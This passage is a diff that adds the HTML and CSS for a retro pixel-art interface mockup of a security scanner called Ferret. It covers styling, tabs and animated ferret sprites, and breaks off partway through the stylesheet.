@@ -1,0 +1,1682 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ferret v1.0.0 — Security Scanner (Concept A+ Enhanced)</title>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+/* ========== RESET & BASE ========== */
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: #080810;
+  color: #c0c0d0;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 13px;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  padding: 30px 20px;
+  position: relative;
+  overflow-x: hidden;
+}
+
+/* CRT scanline overlay */
+body::after {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  pointer-events: none;
+  z-index: 9999;
+  background: repeating-linear-gradient(
+    0deg,
+    rgba(0, 0, 0, 0.03) 0px,
+    rgba(0, 0, 0, 0.03) 1px,
+    transparent 1px,
+    transparent 3px
+  );
+}
+
+/* ========== PIXEL FONTS ========== */
+.pixel-font { font-family: 'Press Start 2P', cursive; }
+.mono-font { font-family: 'JetBrains Mono', monospace; }
+
+/* ========== WINDOW CONTAINER ========== */
+.window {
+  width: 800px;
+  max-width: 100%;
+  background: #0d0d1a;
+  border: 2px solid #1a1a3a;
+  border-radius: 0;
+  box-shadow: 0 0 40px rgba(0, 255, 255, 0.05), 0 0 80px rgba(0, 0, 0, 0.5);
+  position: relative;
+}
+
+/* Title bar */
+.title-bar {
+  background: linear-gradient(90deg, #0a0a1e, #12122a);
+  border-bottom: 2px solid #1a1a3a;
+  padding: 8px 12px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  user-select: none;
+}
+
+.title-bar-text {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 9px;
+  color: #00ffff;
+  text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+}
+
+.title-bar-buttons {
+  display: flex;
+  gap: 6px;
+}
+
+.title-btn {
+  width: 14px;
+  height: 14px;
+  border: 2px solid #1a1a3a;
+  background: #0d0d1a;
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'Press Start 2P', cursive;
+  font-size: 6px;
+  color: #555;
+  transition: all 0.2s;
+}
+
+.title-btn:hover { border-color: #00ffff; color: #00ffff; }
+.title-btn.close:hover { border-color: #ff0040; color: #ff0040; }
+
+/* ========== TABS ========== */
+.tab-bar {
+  display: flex;
+  border-bottom: 2px solid #1a1a3a;
+  background: #0a0a15;
+}
+
+.tab-btn {
+  flex: 1;
+  padding: 10px 8px;
+  font-family: 'Press Start 2P', cursive;
+  font-size: 8px;
+  color: #555;
+  background: transparent;
+  border: none;
+  border-right: 1px solid #1a1a3a;
+  cursor: pointer;
+  transition: all 0.3s;
+  position: relative;
+}
+
+.tab-btn:last-child { border-right: none; }
+
+.tab-btn:hover { color: #888; background: rgba(0, 255, 255, 0.02); }
+
+.tab-btn.active {
+  color: #00ffff;
+  background: #0d0d1a;
+  text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+}
+
+.tab-btn.active::after {
+  content: '';
+  position: absolute;
+  bottom: -2px;
+  left: 0;
+  right: 0;
+  height: 2px;
+  background: #00ffff;
+  box-shadow: 0 0 8px #00ffff;
+}
+
+/* Tab content */
+.tab-content { display: none; padding: 20px; min-height: 550px; }
+.tab-content.active { display: block; }
+
+/* ========== STATUS BAR ========== */
+.status-bar {
+  background: #0a0a15;
+  border-top: 2px solid #1a1a3a;
+  padding: 6px 12px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  font-size: 10px;
+}
+
+.status-dot {
+  width: 8px;
+  height: 8px;
+  background: #00ff41;
+  box-shadow: 0 0 6px #00ff41;
+  display: inline-block;
+  margin-right: 6px;
+}
+
+.status-left { display: flex; align-items: center; color: #00ff41; }
+.status-right { color: #555; font-size: 10px; }
+
+/* ========== PIXEL ART FERRET ========== */
+.ferret-container {
+  position: relative;
+  display: inline-block;
+}
+
+.ferret {
+  width: 1px;
+  height: 1px;
+  transform: scale(3);
+  transform-origin: top left;
+  position: relative;
+}
+
+/* FERRET IDLE POSE - sitting, looking forward */
+.ferret-idle {
+  color: transparent;
+  box-shadow:
+    /* ears */
+    3px 0 0 #c4956a, 4px 0 0 #c4956a, 8px 0 0 #c4956a, 9px 0 0 #c4956a,
+    3px 1px 0 #c4956a, 4px 1px 0 #d4a57a, 8px 1px 0 #d4a57a, 9px 1px 0 #c4956a,
+    /* head top */
+    4px 2px 0 #c4956a, 5px 2px 0 #c4956a, 6px 2px 0 #c4956a, 7px 2px 0 #c4956a, 8px 2px 0 #c4956a,
+    /* head + mask */
+    3px 3px 0 #c4956a, 4px 3px 0 #3a2a1a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 3px 0 #3a2a1a, 9px 3px 0 #c4956a,
+    /* eyes + nose row */
+    3px 4px 0 #c4956a, 4px 4px 0 #00ffff, 5px 4px 0 #3a2a1a, 6px 4px 0 #ff69b4, 7px 4px 0 #3a2a1a, 8px 4px 0 #00ffff, 9px 4px 0 #c4956a,
+    /* chin */
+    4px 5px 0 #c4956a, 5px 5px 0 #f0dcc0, 6px 5px 0 #f0dcc0, 7px 5px 0 #f0dcc0, 8px 5px 0 #c4956a,
+    /* body */
+    3px 6px 0 #c4956a, 4px 6px 0 #c4956a, 5px 6px 0 #f0dcc0, 6px 6px 0 #f0dcc0, 7px 6px 0 #f0dcc0, 8px 6px 0 #c4956a, 9px 6px 0 #c4956a,
+    3px 7px 0 #c4956a, 4px 7px 0 #c4956a, 5px 7px 0 #f0dcc0, 6px 7px 0 #f0dcc0, 7px 7px 0 #f0dcc0, 8px 7px 0 #c4956a, 9px 7px 0 #c4956a,
+    /* legs */
+    3px 8px 0 #c4956a, 4px 8px 0 #c4956a, 8px 8px 0 #c4956a, 9px 8px 0 #c4956a,
+    /* feet */
+    3px 9px 0 #d4a57a, 4px 9px 0 #d4a57a, 8px 9px 0 #d4a57a, 9px 9px 0 #d4a57a,
+    /* tail */
+    10px 5px 0 #c4956a, 11px 4px 0 #c4956a, 12px 3px 0 #c4956a;
+  animation: ferret-idle-anim 1.5s ease-in-out infinite;
+}
+
+@keyframes ferret-idle-anim {
+  0%, 100% {
+    box-shadow:
+      3px 0 0 #c4956a, 4px 0 0 #c4956a, 8px 0 0 #c4956a, 9px 0 0 #c4956a,
+      3px 1px 0 #c4956a, 4px 1px 0 #d4a57a, 8px 1px 0 #d4a57a, 9px 1px 0 #c4956a,
+      4px 2px 0 #c4956a, 5px 2px 0 #c4956a, 6px 2px 0 #c4956a, 7px 2px 0 #c4956a, 8px 2px 0 #c4956a,
+      3px 3px 0 #c4956a, 4px 3px 0 #3a2a1a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 3px 0 #3a2a1a, 9px 3px 0 #c4956a,
+      3px 4px 0 #c4956a, 4px 4px 0 #00ffff, 5px 4px 0 #3a2a1a, 6px 4px 0 #ff69b4, 7px 4px 0 #3a2a1a, 8px 4px 0 #00ffff, 9px 4px 0 #c4956a,
+      4px 5px 0 #c4956a, 5px 5px 0 #f0dcc0, 6px 5px 0 #f0dcc0, 7px 5px 0 #f0dcc0, 8px 5px 0 #c4956a,
+      3px 6px 0 #c4956a, 4px 6px 0 #c4956a, 5px 6px 0 #f0dcc0, 6px 6px 0 #f0dcc0, 7px 6px 0 #f0dcc0, 8px 6px 0 #c4956a, 9px 6px 0 #c4956a,
+      3px 7px 0 #c4956a, 4px 7px 0 #c4956a, 5px 7px 0 #f0dcc0, 6px 7px 0 #f0dcc0, 7px 7px 0 #f0dcc0, 8px 7px 0 #c4956a, 9px 7px 0 #c4956a,
+      3px 8px 0 #c4956a, 4px 8px 0 #c4956a, 8px 8px 0 #c4956a, 9px 8px 0 #c4956a,
+      3px 9px 0 #d4a57a, 4px 9px 0 #d4a57a, 8px 9px 0 #d4a57a, 9px 9px 0 #d4a57a,
+      10px 5px 0 #c4956a, 11px 4px 0 #c4956a, 12px 3px 0 #c4956a;
+  }
+  50% {
+    box-shadow:
+      3px 0 0 #c4956a, 4px 0 0 #c4956a, 8px 0 0 #c4956a, 9px 0 0 #c4956a,
+      3px 1px 0 #c4956a, 4px 1px 0 #d4a57a, 8px 1px 0 #d4a57a, 9px 1px 0 #c4956a,
+      4px 2px 0 #c4956a, 5px 2px 0 #c4956a, 6px 2px 0 #c4956a, 7px 2px 0 #c4956a, 8px 2px 0 #c4956a,
+      3px 3px 0 #c4956a, 4px 3px 0 #3a2a1a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 3px 0 #3a2a1a, 9px 3px 0 #c4956a,
+      3px 4px 0 #c4956a, 4px 4px 0 #00ffff, 5px 4px 0 #3a2a1a, 6px 4px 0 #ff69b4, 7px 4px 0 #3a2a1a, 8px 4px 0 #00ffff, 9px 4px 0 #c4956a,
+      4px 5px 0 #c4956a, 5px 5px 0 #f0dcc0, 6px 5px 0 #f0dcc0, 7px 5px 0 #f0dcc0, 8px 5px 0 #c4956a,
+      3px 6px 0 #c4956a, 4px 6px 0 #c4956a, 5px 6px 0 #f0dcc0, 6px 6px 0 #f0dcc0, 7px 6px 0 #f0dcc0, 8px 6px 0 #c4956a, 9px 6px 0 #c4956a,
+      3px 7px 0 #c4956a, 4px 7px 0 #c4956a, 5px 7px 0 #f0dcc0, 6px 7px 0 #f0dcc0, 7px 7px 0 #f0dcc0, 8px 7px 0 #c4956a, 9px 7px 0 #c4956a,
+      3px 8px 0 #c4956a, 4px 8px 0 #c4956a, 8px 8px 0 #c4956a, 9px 8px 0 #c4956a,
+      3px 9px 0 #d4a57a, 4px 9px 0 #d4a57a, 8px 9px 0 #d4a57a, 9px 9px 0 #d4a57a,
+      10px 5px 0 #c4956a, 11px 5px 0 #c4956a, 12px 4px 0 #c4956a;
+  }
+}
+
+/* FERRET SNIFF POSE - nose down, elongated body */
+.ferret-sniff {
+  color: transparent;
+  box-shadow:
+    /* ears */
+    2px 0 0 #c4956a, 3px 0 0 #c4956a, 6px 0 0 #c4956a, 7px 0 0 #c4956a,
+    /* head */
+    2px 1px 0 #c4956a, 3px 1px 0 #c4956a, 4px 1px 0 #c4956a, 5px 1px 0 #c4956a, 6px 1px 0 #c4956a, 7px 1px 0 #c4956a,
+    /* mask + eyes */
+    1px 2px 0 #c4956a, 2px 2px 0 #3a2a1a, 3px 2px 0 #00ffff, 4px 2px 0 #3a2a1a, 5px 2px 0 #3a2a1a, 6px 2px 0 #00ffff, 7px 2px 0 #3a2a1a, 8px 2px 0 #c4956a,
+    /* snout extended down */
+    2px 3px 0 #c4956a, 3px 3px 0 #f0dcc0, 4px 3px 0 #ff69b4, 5px 3px 0 #f0dcc0, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a,
+    /* body elongated */
+    3px 4px 0 #c4956a, 4px 4px 0 #f0dcc0, 5px 4px 0 #f0dcc0, 6px 4px 0 #c4956a, 7px 4px 0 #c4956a, 8px 4px 0 #c4956a, 9px 4px 0 #c4956a, 10px 4px 0 #c4956a,
+    3px 5px 0 #c4956a, 4px 5px 0 #f0dcc0, 5px 5px 0 #f0dcc0, 6px 5px 0 #c4956a, 7px 5px 0 #c4956a, 8px 5px 0 #c4956a, 9px 5px 0 #c4956a, 10px 5px 0 #c4956a,
+    /* legs */
+    4px 6px 0 #c4956a, 5px 6px 0 #c4956a, 8px 6px 0 #c4956a, 9px 6px 0 #c4956a,
+    4px 7px 0 #d4a57a, 5px 7px 0 #d4a57a, 8px 7px 0 #d4a57a, 9px 7px 0 #d4a57a,
+    /* tail */
+    11px 3px 0 #c4956a, 12px 2px 0 #c4956a;
+  animation: ferret-sniff-anim 0.5s ease-in-out infinite;
+}
+
+@keyframes ferret-sniff-anim {
+  0%, 100% { transform: scale(3) translateY(0); }
+  50% { transform: scale(3) translateY(0.5px); }
+}
+
+/* FERRET RUN RIGHT POSE */
+.ferret-run-right {
+  color: transparent;
+  animation: ferret-run-anim 0.3s steps(1) infinite;
+}
+
+@keyframes ferret-run-anim {
+  0%, 49% {
+    box-shadow:
+      /* head */
+      7px 1px 0 #c4956a, 8px 1px 0 #c4956a, 9px 0 0 #c4956a, 10px 0 0 #c4956a,
+      7px 2px 0 #3a2a1a, 8px 2px 0 #00ffff, 9px 1px 0 #c4956a, 10px 1px 0 #c4956a, 11px 1px 0 #c4956a,
+      8px 3px 0 #c4956a, 9px 2px 0 #ff69b4, 10px 2px 0 #3a2a1a, 11px 2px 0 #00ffff, 12px 2px 0 #c4956a,
+      9px 3px 0 #f0dcc0, 10px 3px 0 #f0dcc0, 11px 3px 0 #c4956a,
+      /* body */
+      2px 3px 0 #c4956a, 3px 3px 0 #c4956a, 4px 3px 0 #c4956a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 4px 0 #c4956a,
+      2px 4px 0 #c4956a, 3px 4px 0 #c4956a, 4px 4px 0 #f0dcc0, 5px 4px 0 #f0dcc0, 6px 4px 0 #f0dcc0, 7px 4px 0 #c4956a,
+      /* legs frame 1 - front extended, back tucked */
+      3px 5px 0 #c4956a, 7px 5px 0 #c4956a, 8px 5px 0 #c4956a,
+      2px 6px 0 #d4a57a, 9px 5px 0 #d4a57a,
+      /* tail */
+      0px 2px 0 #c4956a, 1px 2px 0 #c4956a;
+  }
+  50%, 100% {
+    box-shadow:
+      /* head */
+      7px 1px 0 #c4956a, 8px 1px 0 #c4956a, 9px 0 0 #c4956a, 10px 0 0 #c4956a,
+      7px 2px 0 #3a2a1a, 8px 2px 0 #00ffff, 9px 1px 0 #c4956a, 10px 1px 0 #c4956a, 11px 1px 0 #c4956a,
+      8px 3px 0 #c4956a, 9px 2px 0 #ff69b4, 10px 2px 0 #3a2a1a, 11px 2px 0 #00ffff, 12px 2px 0 #c4956a,
+      9px 3px 0 #f0dcc0, 10px 3px 0 #f0dcc0, 11px 3px 0 #c4956a,
+      /* body */
+      2px 3px 0 #c4956a, 3px 3px 0 #c4956a, 4px 3px 0 #c4956a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 4px 0 #c4956a,
+      2px 4px 0 #c4956a, 3px 4px 0 #c4956a, 4px 4px 0 #f0dcc0, 5px 4px 0 #f0dcc0, 6px 4px 0 #f0dcc0, 7px 4px 0 #c4956a,
+      /* legs frame 2 - reversed */
+      4px 5px 0 #c4956a, 6px 5px 0 #c4956a,
+      4px 6px 0 #d4a57a, 6px 6px 0 #d4a57a,
+      /* tail */
+      0px 3px 0 #c4956a, 1px 2px 0 #c4956a;
+  }
+}
+
+/* FERRET FOUND POSE - standing alert with ! */
+.ferret-found {
+  color: transparent;
+  box-shadow:
+    /* exclamation mark */
+    6px -4px 0 #00ffff, 6px -3px 0 #00ffff, 6px -2px 0 #00ffff, 6px 0px 0 #00ffff,
+    /* ears up */
+    3px 1px 0 #c4956a, 4px 1px 0 #c4956a, 8px 1px 0 #c4956a, 9px 1px 0 #c4956a,
+    3px 2px 0 #d4a57a, 9px 2px 0 #d4a57a,
+    /* head */
+    4px 3px 0 #c4956a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 3px 0 #c4956a,
+    /* mask + eyes (wide) */
+    3px 4px 0 #c4956a, 4px 4px 0 #3a2a1a, 5px 4px 0 #c4956a, 6px 4px 0 #c4956a, 7px 4px 0 #c4956a, 8px 4px 0 #3a2a1a, 9px 4px 0 #c4956a,
+    3px 5px 0 #c4956a, 4px 5px 0 #00ffff, 5px 5px 0 #3a2a1a, 6px 5px 0 #ff69b4, 7px 5px 0 #3a2a1a, 8px 5px 0 #00ffff, 9px 5px 0 #c4956a,
+    /* mouth open */
+    4px 6px 0 #c4956a, 5px 6px 0 #f0dcc0, 6px 6px 0 #3a2a1a, 7px 6px 0 #f0dcc0, 8px 6px 0 #c4956a,
+    /* body */
+    4px 7px 0 #c4956a, 5px 7px 0 #f0dcc0, 6px 7px 0 #f0dcc0, 7px 7px 0 #f0dcc0, 8px 7px 0 #c4956a,
+    4px 8px 0 #c4956a, 5px 8px 0 #f0dcc0, 6px 8px 0 #f0dcc0, 7px 8px 0 #f0dcc0, 8px 8px 0 #c4956a,
+    /* arms out */
+    2px 7px 0 #c4956a, 3px 7px 0 #c4956a, 9px 7px 0 #c4956a, 10px 7px 0 #c4956a,
+    /* legs */
+    4px 9px 0 #c4956a, 5px 9px 0 #c4956a, 7px 9px 0 #c4956a, 8px 9px 0 #c4956a,
+    4px 10px 0 #d4a57a, 5px 10px 0 #d4a57a, 7px 10px 0 #d4a57a, 8px 10px 0 #d4a57a;
+  animation: ferret-found-anim 0.4s ease-in-out infinite;
+}
+
+@keyframes ferret-found-anim {
+  0%, 100% { transform: scale(3) translateY(0); }
+  50% { transform: scale(3) translateY(-1px); }
+}
+
+/* FERRET HAPPY POSE - sparkle eyes, stars */
+.ferret-happy {
+  color: transparent;
+  box-shadow:
+    /* stars around */
+    0px 0 0 #00ffff, 12px 0 0 #ff00ff, 1px 8px 0 #ffb800, 13px 2px 0 #00ff41,
+    /* ears */
+    3px 1px 0 #c4956a, 4px 1px 0 #c4956a, 8px 1px 0 #c4956a, 9px 1px 0 #c4956a,
+    3px 2px 0 #d4a57a, 9px 2px 0 #d4a57a,
+    /* head */
+    4px 3px 0 #c4956a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 3px 0 #c4956a,
+    /* mask + sparkle eyes */
+    3px 4px 0 #c4956a, 4px 4px 0 #3a2a1a, 5px 4px 0 #c4956a, 6px 4px 0 #c4956a, 7px 4px 0 #c4956a, 8px 4px 0 #3a2a1a, 9px 4px 0 #c4956a,
+    3px 5px 0 #c4956a, 4px 5px 0 #ffb800, 5px 5px 0 #3a2a1a, 6px 5px 0 #ff69b4, 7px 5px 0 #3a2a1a, 8px 5px 0 #ffb800, 9px 5px 0 #c4956a,
+    /* happy mouth */
+    4px 6px 0 #c4956a, 5px 6px 0 #f0dcc0, 6px 6px 0 #f0dcc0, 7px 6px 0 #f0dcc0, 8px 6px 0 #c4956a,
+    /* body */
+    3px 7px 0 #c4956a, 4px 7px 0 #c4956a, 5px 7px 0 #f0dcc0, 6px 7px 0 #f0dcc0, 7px 7px 0 #f0dcc0, 8px 7px 0 #c4956a, 9px 7px 0 #c4956a,
+    3px 8px 0 #c4956a, 4px 8px 0 #c4956a, 5px 8px 0 #f0dcc0, 6px 8px 0 #f0dcc0, 7px 8px 0 #f0dcc0, 8px 8px 0 #c4956a, 9px 8px 0 #c4956a,
+    /* legs */
+    3px 9px 0 #c4956a, 4px 9px 0 #c4956a, 8px 9px 0 #c4956a, 9px 9px 0 #c4956a,
+    3px 10px 0 #d4a57a, 4px 10px 0 #d4a57a, 8px 10px 0 #d4a57a, 9px 10px 0 #d4a57a,
+    /* tail wagging up */
+    10px 6px 0 #c4956a, 11px 5px 0 #c4956a, 12px 4px 0 #c4956a;
+  animation: ferret-happy-anim 0.6s ease-in-out infinite;
+}
+
+@keyframes ferret-happy-anim {
+  0%, 100% {
+    box-shadow:
+      0px 0 0 #00ffff, 12px 0 0 #ff00ff, 1px 8px 0 #ffb800, 13px 2px 0 #00ff41,
+      3px 1px 0 #c4956a, 4px 1px 0 #c4956a, 8px 1px 0 #c4956a, 9px 1px 0 #c4956a,
+      3px 2px 0 #d4a57a, 9px 2px 0 #d4a57a,
+      4px 3px 0 #c4956a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 3px 0 #c4956a,
+      3px 4px 0 #c4956a, 4px 4px 0 #3a2a1a, 5px 4px 0 #c4956a, 6px 4px 0 #c4956a, 7px 4px 0 #c4956a, 8px 4px 0 #3a2a1a, 9px 4px 0 #c4956a,
+      3px 5px 0 #c4956a, 4px 5px 0 #ffb800, 5px 5px 0 #3a2a1a, 6px 5px 0 #ff69b4, 7px 5px 0 #3a2a1a, 8px 5px 0 #ffb800, 9px 5px 0 #c4956a,
+      4px 6px 0 #c4956a, 5px 6px 0 #f0dcc0, 6px 6px 0 #f0dcc0, 7px 6px 0 #f0dcc0, 8px 6px 0 #c4956a,
+      3px 7px 0 #c4956a, 4px 7px 0 #c4956a, 5px 7px 0 #f0dcc0, 6px 7px 0 #f0dcc0, 7px 7px 0 #f0dcc0, 8px 7px 0 #c4956a, 9px 7px 0 #c4956a,
+      3px 8px 0 #c4956a, 4px 8px 0 #c4956a, 5px 8px 0 #f0dcc0, 6px 8px 0 #f0dcc0, 7px 8px 0 #f0dcc0, 8px 8px 0 #c4956a, 9px 8px 0 #c4956a,
+      3px 9px 0 #c4956a, 4px 9px 0 #c4956a, 8px 9px 0 #c4956a, 9px 9px 0 #c4956a,
+      3px 10px 0 #d4a57a, 4px 10px 0 #d4a57a, 8px 10px 0 #d4a57a, 9px 10px 0 #d4a57a,
+      10px 6px 0 #c4956a, 11px 5px 0 #c4956a, 12px 4px 0 #c4956a;
+  }
+  50% {
+    box-shadow:
+      1px -1px 0 #00ffff, 13px 1px 0 #ff00ff, 0px 9px 0 #ffb800, 12px 1px 0 #00ff41,
+      3px 1px 0 #c4956a, 4px 1px 0 #c4956a, 8px 1px 0 #c4956a, 9px 1px 0 #c4956a,
+      3px 2px 0 #d4a57a, 9px 2px 0 #d4a57a,
+      4px 3px 0 #c4956a, 5px 3px 0 #c4956a, 6px 3px 0 #c4956a, 7px 3px 0 #c4956a, 8px 3px 0 #c4956a,
+      3px 4px 0 #c4956a, 4px 4px 0 #3a2a1a, 5px 4px 0 #c4956a, 6px 4px 0 #c4956a, 7px 4px 0 #c4956a, 8px 4px 0 #3a2a1a, 9px 4px 0 #c4956a,
+      3px 5px 0 #c4956a, 4px 5px 0 #ffb800, 5px 5px 0 #3a2a1a, 6px 5px 0 #ff69b4, 7px 5px 0 #3a2a1a, 8px 5px 0 #ffb800, 9px 5px 0 #c4956a,
+      4px 6px 0 #c4956a, 5px 6px 0 #f0dcc0, 6px 6px 0 #f0dcc0, 7px 6px 0 #f0dcc0, 8px 6px 0 #c4956a,
+      3px 7px 0 #c4956a, 4px 7px 0 #c4956a, 5px 7px 0 #f0dcc0, 6px 7px 0 #f0dcc0, 7px 7px 0 #f0dcc0, 8px 7px 0 #c4956a, 9px 7px 0 #c4956a,
+      3px 8px 0 #c4956a, 4px 8px 0 #c4956a, 5px 8px 0 #f0dcc0, 6px 8px 0 #f0dcc0, 7px 8px 0 #f0dcc0, 8px 8px 0 #c4956a, 9px 8px 0 #c4956a,
+      3px 9px 0 #c4956a, 4px 9px 0 #c4956a, 8px 9px 0 #c4956a, 9px 9px 0 #c4956a,
+      3px 10px 0 #d4a57a, 4px 10px 0 #d4a57a, 8px 10px 0 #d4a57a, 9px 10px 0 #d4a57a,
+      10px 7px 0 #c4956a, 11px 6px 0 #c4956a, 12px 5px 0 #c4956a;
+  }
+}
+
+/* Ferret wrapper for positioning */
+.ferret-wrap {
+  display: inline-block;
+  width: 42px;
+  height: 36px;
+  position: relative;
+}
+
+.ferret-wrap .ferret {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+/* Speech bubble */
+.speech-bubble {
+  position: relative;
+  display: inline-block;
+  background: #1a1a3a;
+  border: 2px solid #00ffff;
+  padding: 6px 12px;
+  font-family: 'Press Start 2P', cursive;
+  font-size: 7px;
+  color: #00ffff;
+  margin-bottom: 8px;
+}
+
+.speech-bubble::after {
+  content: '';
+  position: absolute;
+  bottom: -8px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 0;
+  height: 0;
+  border-left: 6px solid transparent;
+  border-right: 6px solid transparent;
+  border-top: 8px solid #00ffff;
+}
+
+.speech-bubble-inner::after {
+  content: '';
+  position: absolute;
+  bottom: -5px;
+  left: 50%;
+  transform: translateX(-50%);
+  width: 0;
+  height: 0;
+  border-left: 4px solid transparent;
+  border-right: 4px solid transparent;
+  border-top: 6px solid #1a1a3a;
+}
+
+/* ========== HOME TAB ========== */
+.home-hero {
+  text-align: center;
+  padding: 20px 0;
+}
+
+.home-title {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 36px;
+  color: #00ffff;
+  text-shadow: 0 0 20px rgba(0, 255, 255, 0.6), 0 0 40px rgba(0, 255, 255, 0.3), 0 0 80px rgba(0, 255, 255, 0.1);
+  margin-bottom: 6px;
+  letter-spacing: 4px;
+}
+
+.home-by {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 10px;
+  color: #ff00ff;
+  text-shadow: 0 0 10px rgba(255, 0, 255, 0.5);
+  margin-bottom: 4px;
+}
+
+.home-subtitle {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 11px;
+  color: #555;
+  letter-spacing: 3px;
+  margin-bottom: 30px;
+}
+
+.home-ferret-area {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin: 20px 0 30px 0;
+}
+
+.ferret-float {
+  animation: float 3s ease-in-out infinite;
+}
+
+@keyframes float {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-6px); }
+}
+
+.sys-info {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: #555;
+  text-align: center;
+  margin: 16px 0;
+  padding: 8px 16px;
+  border: 1px solid #1a1a3a;
+  display: inline-block;
+}
+
+.sys-info span { color: #00ffff; }
+
+.start-btn {
+  display: inline-block;
+  font-family: 'Press Start 2P', cursive;
+  font-size: 14px;
+  color: #00ffff;
+  background: transparent;
+  border: 3px solid #00ffff;
+  padding: 16px 40px;
+  cursor: pointer;
+  transition: all 0.3s;
+  text-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+  position: relative;
+  margin: 10px 0;
+}
+
+.start-btn:hover {
+  background: rgba(0, 255, 255, 0.1);
+  box-shadow: 0 0 20px rgba(0, 255, 255, 0.4), inset 0 0 20px rgba(0, 255, 255, 0.1);
+  transform: scale(1.02);
+}
+
+.start-btn:active { transform: scale(0.98); }
+
+.scan-badges {
+  display: flex;
+  justify-content: center;
+  gap: 8px;
+  margin-top: 20px;
+  flex-wrap: wrap;
+}
+
+.scan-badge {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 7px;
+  color: #888;
+  border: 1px solid #1a1a3a;
+  padding: 5px 10px;
+  background: rgba(0, 255, 255, 0.02);
+}
+
+.admin-notice {
+  text-align: center;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 10px;
+  color: #ffb800;
+  margin-top: 16px;
+  padding: 8px;
+  border: 1px dashed #ffb800;
+  background: rgba(255, 184, 0, 0.03);
+}
+
+/* ========== SCANNING TAB ========== */
+.scan-header {
+  text-align: center;
+  margin-bottom: 16px;
+}
+
+.scan-header h2 {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 14px;
+  color: #00ffff;
+  text-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+  animation: pulse-text 1.5s ease-in-out infinite;
+}
+
+@keyframes pulse-text {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.7; }
+}
+
+.scan-timer {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px;
+  color: #888;
+  margin-top: 6px;
+}
+
+.scan-timer span { color: #00ffff; }
+
+/* Scan scene */
+.scan-scene {
+  width: 100%;
+  height: 260px;
+  background:
+    linear-gradient(rgba(0, 255, 255, 0.02) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0, 255, 255, 0.02) 1px, transparent 1px),
+    #080810;
+  background-size: 20px 20px;
+  border: 2px solid #1a1a3a;
+  position: relative;
+  overflow: hidden;
+  margin-bottom: 16px;
+}
+
+.scan-zone {
+  position: absolute;
+  width: 130px;
+  height: 90px;
+  border: 1px solid #1a1a3a;
+  background: rgba(13, 13, 26, 0.8);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  transition: all 0.5s;
+  z-index: 1;
+}
+
+.scan-zone.active {
+  border-color: #00ffff;
+  box-shadow: 0 0 20px rgba(0, 255, 255, 0.2), inset 0 0 15px rgba(0, 255, 255, 0.05);
+  background: rgba(0, 255, 255, 0.03);
+}
+
+.scan-zone.completed {
+  border-color: #00ff41;
+  background: rgba(0, 255, 65, 0.03);
+}
+
+.scan-zone.found {
+  border-color: #ff8800;
+  box-shadow: 0 0 20px rgba(255, 136, 0, 0.3);
+  background: rgba(255, 136, 0, 0.05);
+}
+
+.zone-icon {
+  font-size: 22px;
+  margin-bottom: 4px;
+  filter: grayscale(1) brightness(0.5);
+  transition: all 0.5s;
+}
+
+.scan-zone.active .zone-icon,
+.scan-zone.completed .zone-icon { filter: grayscale(0) brightness(1); }
+
+.zone-label {
+  font-family: 'Press Start 2P', cursive;
+  font-size: 6px;
+  color: #555;
+  transition: all 0.5s;
+}
+
+.scan-zone.active .zone-label { color: #00ffff; }
+.scan-zone.completed .zone-label { color: #00ff41; }
+
+.zone-check {
+  position: absolute;
+  top: 4px;
+  right: 6px;
+  font-family: 'Press Start 2P', cursive;
+  font-size: 8px;
+  color: #00ff41;
+  opacity: 0;
+  transition: opacity 0.3s;
+  text-shadow: 0 0 6px #00ff41;
+}
+
+.scan-zone.completed .zone-check { opacity: 1; }
+
+/* Scanning ferret - positioned absolutely in scene */
+.scene-ferret {
+  position: absolute;
+  z-index: 10;
+  transition: left 0.6s ease-in-out, top 0.6s ease-in-out;
+  pointer-events: none;
+}
+
+/* Progress bar */
+.progress-section {
+  margin-bottom: 12px;
+}
+
+.progress-bar-container {
+  display: flex;
+  gap: 3px;
